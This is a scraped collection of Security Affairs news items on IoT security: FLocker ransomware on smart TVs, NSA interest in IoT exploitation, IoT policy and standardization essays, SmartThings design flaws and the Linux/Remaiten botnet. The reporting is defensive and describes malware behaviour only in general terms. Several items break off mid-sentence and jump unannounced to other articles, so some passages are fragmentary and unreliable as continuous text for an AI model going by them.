"https://securityaffairs.co/wordpress/tag/cctv-cameras", "topic_name": "CCTV cameras"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}]}, {"news_name": "Watch out, FLocker Ransomware targets Android smart TVs", "news_link": "https://securityaffairs.co/wordpress/48383/iot/flocker-ransomware-smart-tvs.html", "title": "Watch out, FLocker Ransomware targets Android smart TVs\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 14, 2016", "body": "When a journalist asked me which is a possible evolution of ransomware I had no doubt, the Internet of Things. I was thinking of ransomware that infects medical devices and Smart objects in our homes.\n\nThe day has come, Sharp and Philips smart TV running the Android TV OS could be infected by a ransomware dubbed FLocker (short for \u201cFrantic Locker\u201d).  FLocker, aka ANDROIDOS_FLOCKER.A, is a ransomware specifically designed to target Android mobile devices and smart TVs.\n\nFLocker isn\u2019t a new threat, it has been around for a year and crooks delivered it to the victims via spam SMS campaigns or sharing malicious links.\n\nThe FLocker ransomware was first spotted on May 2015, security experts from Trend Micro detected more than 7,000 strains of the same malware. The threat actors behind the FLocker ransomware has updated over the time the threat improving it and making had its detection by security solutions.  Over the past few months, the experts observed a number of spikes and drops in the number of iterations released in the wild, in the last wave of infection observed in the mid-April the researchers detected over 1,200 variants.\n\n\u201cThe latest variant of FLocker is a police Trojan that pretends to be US Cyber Police or another law enforcement agency, and it accuses potential victims of crimes they didn\u2019t commit. It then demands 200 USD worth of iTunes gift cards,\u201d states the analysis published by TrendMicro. \u201cBased on our analysis, there is also no major difference between a FLocker variant that can infect a mobile device and one that affects smart TVs.\u201d\n\nThe last interaction discovered by the experts pretends to be an enforcement agency and threatens the victims of crimes they didn\u2019t commit. It locks the device by demanding a 200 USD-ransomware worth of iTunes gift cards, it\u2019s ridiculous a cyber police that requires iTunes gift cards instead cash.\n\n\n\nOnce infected a device, the malware checks the user\u2019s country to avoid infecting machines of Kazakhstan, Azerbaijan, Bulgaria, Georgia, Hungary, Ukraine, Russia, Armenia, and Belarus.\n\nThe FLocker ransomware remains inactive for 30 minutes before running then it launched the background service which requests device admin privileges immediately. If the user doesn\u2019t grant the admin privileges the FLocker ransomware will freeze the screen simulating a system updating.\n\nAt this point, the threat contacts C&C that in turn delivers a new APK file and the ransom note which starts the APK installation, takes photos of the infected device and displays the photos taken inside the ransom page. The note is written in the language used in the country of the infected device.\n\nTrend Micro suggests victims to contact device vendors in case of infection, a second option is to enable ADB debugging and operate via the ADB shell in order to sanitize the device and kill the ransomware.\n\n\u201cIf an Android TV gets infected, we suggest user to contact the device vendor for solution at first,\u201d reads the analysis.\n\n\u201cAnother way of removing the malware is possible if the user can enable ADB debugging. Users can connect their device with a PC and launch the ADB shell and execute the command \u2018PM clear %pkg%\u2019. This kills the ransomware process and unlocks the screen. Users can then deactivate the device admin privilege granted to the application and uninstall the app.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013 FLocker ransomware, mobile)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/android", "topic_name": "Android"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flocker-ransomware", "topic_name": "FLocker ransomware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet-of-things", "topic_name": "Internet of Things"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mobile", "topic_name": "mobile"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ransomware", "topic_name": "ransomware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/smart-tv", "topic_name": "smart TV"}]}, {"news_name": "The NSA wants to exploit IoT devices for surveillance and sabotage", "news_link": "https://securityaffairs.co/wordpress/48319/iot/nsa-iot-devices.html", "title": "The NSA wants to exploit IoT devices for surveillance and sabotage\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 13, 2016", "body": "Intelligence agencies worldwide are looking with increasing interest to the Internet of Things paradigm, intelligent objects surround us and manage an impressive volume of data related to of existence.\n\nThanks to the Internet of Things devices, we become nodes of a global network, hacking this network allow spies to spy on everyone.\n\nThis is also the intent of the U.S. National Security Agency who is working to develop cyber espionage capabilities through IoT devices.\n\n\u201cAs my job is to penetrate other people\u2019s networks, complexity is my friend,\u201d he said of the growing mass of common household and office items that are increasingly likely to be logged in to a nearby Wi-Fi network. \u201cThe first time you update the software, you introduce vulnerabilities \u2014 or variables, rather.

Thus, it becomes critical that controls are in place to ensure the security of the technologies we rely on \u2013 and this is where we play our social function as the cybersecurity community. An IoT world is inevitable in the natural progression of a technology-oriented society, but we must first address the policy, technological, and cultural challenges before riding the next wave of business opportunities.\n\n\n\nIn a recent IoT Security Survey conducted by IOActive (March 2016), 70% of respondents believed that fewer than a quarter of IoT products have adequate security designed in them. Amongst the biggest challenges facing IoT security was Uneducated Users, Data Privacy, and Design. Since the Dot-Com era, a hazardous phenomenon began to infest the culture of the industry: the first-to-market wins. As businesses rushed to push out their product into the market before their competitors, they captured more consumers and funding; the opportunity cost of this was insecure hardware and software that, to now, threaten the privacy and security of end-users.\n\nFor many businesses, it is too risky to begin investing in IoT products. In the past two years alone, we have seen companies and agencies \u2013 that we would expect to have the most secure data centers \u2013 get breached. Cybersecurity is challenging. This said, the emergence of cloud networks have allowed for companies to work with cloud providers on strengthening the security of data in storage and transmission. It is not perfect yet, but we are making more progress than ever.\n\nFor other businesses, skepticism of a common IoT protocol makes it difficult to justify investments in the R&D of IoT devices. As told to me by a mentor in the security community, \u201cWould you as a CEO spend 1 billion dollars building IoT devices if the language that you would use to communicate with them might be considered outdated in 2-3 years when IETF or someone else comes up with a set of rules on how IoT devices should be managed?\u201d Until there is common security policy that can guide the direction for businesses to follow, little progress will be made in the markets surrounding IoT.\n\nLastly, there are technological challenges that must be addressed from the C-level down to developers in the creation of future IoT technologies. The OWASP Internet of Things Project outlines the top ten security concerns regarding IoT devices that can be controlled through secure programming and design, which include vulnerabilities in encryption, transport layer, and web interfaces.\n\nAs bleak as it may sound, we still have to make a few leaps before we can realize the vision of a future society where technology and man synchronize securely. It requires the cooperation of businesses and governments, and a cultural change where cybersecurity is valued just as much as locking the front door of your house. As we becomes more dependent on the interconnections and comfort offered through the internet and associated technologies, security and privacy must play a bigger role in national and international dialogue.\n\nJeff Tso is a cybersecurity professional who has experience in both the technical and business realms of Cybersecurity.

There are numerous standards being followed currently in the IOT space to connect various devices but no single global framework is followed.\n\nLike the TCP for internet or the IPV4/6 for connectivity which has become the global standard. We have seen the telecommunication and internet revolution simultaneously happening which has fueled various innovations and has made life much more convenient. Even though 2G, 3G, 4G, 5G technologies along with Internet have been globally standardized, the IOT which uses internet as a platform has not yet been standardized. The objective of IOT standardization is to create one language for IOT communication. Even though historically many technological standards have been standardized to a global standard, the IOT world is in a state of chaos and is actually diverging into many individual standard formats than converging into one. Think of the data that were recorded in the cassette tapes and VCR system. Their formats are not compatible in today\u2019s data format and hence obsolete. This will \u201cdistinguish past from the future, by marching away from the chaos, the randomness, and moving towards stability. This is why standards are necessary\u201d. (Campbell, J., 1983. Grammatical Man, A Touchstone Book, Simon & Schuster, Inc., page 265.)\n\nThe way hierarchy structure in an organization reduces the data analytics time as only the managers data have to be analyzed as each manager manages few associates. Therefore less data analysis saves time and hence cost. Most economics theory is based on saving time. Most of the ecommerce startup like online grocery (Food tech startup) or cab aggregators like Uber focus on saving time using mobile apps hence save effort and cost.\n\nStandardization will in turn save enormous amount of time and cost. One of the major changes in this space has been triggered due to the declining cost of sensors and cloud storage.\n\nIn the world of standardization in IOT, there are many wicked problems. To make people accountable and fix the issues, one standard is imperative. There has been very significant shift in new technology adoption. From innovation to adoption of a technology there are series of events that unfold. Before I explain this shift, let me start with a \u2018why\u2019 by asking why IOT standardization now? There are 3 reasons why there is a need for standardization of IOT now.\n\nProtocols for interoperability have to be standardized for ease of communication. Each sensor generates data which has to communicate with every other device. Different naming and addressing standards will lead to device searching issues. Hence talking to each other in the same language is of prime importance. The narrative of the English language gaining dominance as the global language supports my argument of having a universal IOT language for communication.\n\nNow talking about the power game of who can influence the standardization process. How standardization will work? Or probably should we be asking will it ever work? To kick start this complex initiative I strongly propose a global campaign for \u2018IOTism\u2019. Currently we are witnessing an IOT ecosystem which lacks strong global IPR rules, neutral governance and a balanced participation or representation. The solution to this problem would come from game theory. Without an unbiased authority or a policy maker, it will be impossible to have a truly global IoT ecosystem.\n\nHow and what would the governance of the IoT be like? Will it be a state-led agency, or a group under the supervision of the UN, or an industrial consortium? Currently the various power players in the standards world like ITU, ICANN, IEEE, OIC, W3C, ISO, ITEF and industry verticals standard are present who wants to influence a larger pie. Applying Game theory to IOTism for adoption of ONE universal theory \u2013 If everyone adopts the standard at the same time, it will be successful. Need of the hour is to bring all institutions together and frame an IOT standard together.\n\n\nCurrently by the end of 2015, IOT Industry market is around 0.8 Trillion USD. The true market value of the IOT industry would be created only if there is integration of all IOT standards into just one. If I assume approx. 400 current standards, then IOT standardization values= 0.8/400= 2 Billion. This per capita or per standard value bring down the efficiency of the IOT industry as a whole. Therefore if and only if the IOT standard share is 1, then the IOT market value can be maximized.\n\nThe way a Governance Risk and Compliance (GRC) Automation platform or tool in Cyber security space has a basic foundation which has workflow, dashboard, application linking, access and role management etc and any use case or application module can sit on top of it. Similarly IOT TRUST foundation could be common globally. Any organization/industry is free to map their customized processes on top of the base foundation framework. This will control the input and output of data. Hence achieving a universal standard and a contextual technology layer wrapped on top of it.\n\nAlso it is imperative to understand that once the IOT standardization is achieved, there should be a smooth transition strategy like a migration roadmap plan for the previous standards (currently approximately 450 IOT standards exists) and not just leave on the market to decide the adoption. The responsibility of this group would be to think ahead of the curve and make the necessary changes to the framework to be compatible and accommodative for future innovations. IOT is an extension to human organs and hence the game of IOTism to ORGANism should be played very responsibly. We should keep in mind what happens to humanity when there is technological singularity! Else the next world war could be fought over standard Information of Things!\n\nEnjoy the report \u201cCHAOS THEORY OF STANDARDIZATION IN IOT\u201d\n\nWritten by: Deric Karunesudas\n\nDeric Karunesudas is currently working with a global MNC in the Sales domain handling Cyber security business.

First, although SmartThings implements a privilege separation model, we discovered two intrinsic design flaws that lead to significant overprivilege in SmartApps. Our analysis reveals that over 55% of SmartApps in the store are overprivileged due to the capabilities being too coarse-grained. Moreover, once installed, a SmartApp is granted full access to a device even if it specifies needing only limited access to the device.\u201d the researchers wrote in a paper \u201cSecond, the SmartThings event subsystem, which devices use to communicate asynchronously with SmartApps via events, does not sufficiently protect events that carry sensitive information such as lock codes.\u201d\n\nIn the second attack scenario, the researchers exploited a design flaw in the SmartThings framework by creating a proof-of-concept app that requested only privileges to monitor the battery reserves, but that in reality was able to steal the lock codes from the devices.\n\nThe experts devised several proof-of-concept exploits including the ones against the Samsung SmartThings IoT platform.\n\nThe exploits leverage on two design flaws in the SmartThings framework.

It also provides some improvements as well as a couple of new features. We call this new threat Linux/Remaiten. So far, we have seen three versions ofLinux/Remaiten that identify themselves as versions 2.0, 2.1 and 2.2.

If the malware successfully login the device, it establishes a shell command to download other malicious binaries on the infected system.\n\nThe Linux Remaiten downloaders are small ELF executables embedded in the bot binary itself that are executed on the target devices to instruct it in connecting the bot\u2019s C&C server.
